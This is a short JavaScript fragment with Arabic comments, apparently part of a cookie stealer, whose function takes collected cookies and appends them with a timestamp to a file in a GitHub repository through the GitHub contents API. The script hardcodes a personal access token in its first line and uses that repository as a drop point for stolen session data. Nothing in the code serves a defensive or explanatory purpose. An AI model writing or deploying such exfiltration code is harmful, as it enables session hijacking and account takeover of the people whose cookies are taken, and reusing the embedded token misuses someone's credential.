var GITHUB_TOKEN  = "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";   // ← Personal Access Token

// ==============================
// دالة حفظ الكوكيز في GitHub
// ==============================
function saveToGitHub(cookies) {
  var apiUrl = "https://api.github.com/repos/"
    + GITHUB_OWNER + "/"
    + GITHUB_REPO  + "/contents/"
    + GITHUB_FILE;

  var headers = {
    "Authorization": "token " + GITHUB_TOKEN,
    "Content-Type":  "application/json",
    "Accept":        "application/vnd.github.v3+json"
  };

  // الخطوة 1: جلب الملف الحالي للحصول على SHA
  fetch(apiUrl, { headers: headers })
  .then(function(r) { return r.json() })
  .then(function(data) {

    var time    = new Date().toISOString();
    var oldText = data.content
      ? atob(data.content.replace(/\n/g,''))
      : '';

    var newText = oldText
      + "\n=====================================\n"
      + "TIME:    " + time + "\n"
      + "COOKIES:\n" + cookies + "\n"
      + "=====================================\n";

    var newContent = btoa(unescape(encodeURIComponent(newText)));

    var body = {
      message: "update",
      content: newContent
    };

    // أضف SHA لو الملف موجود
    if(data.sha) body.sha = data.sha;

    // الخطوة 2: تحديث الملف
    return fetch(apiUrl, {
      method:  "PUT",
      headers: headers,
      body:    JSON.stringify(body)
    });
  })
  .then(function(r) { return r.json() })
  .then(function(result) {
    console.log('[✅] Saved to GitHub!');
  })
  .catch(function(e) {
    console.log('[❌] Error:', e);
  });
}
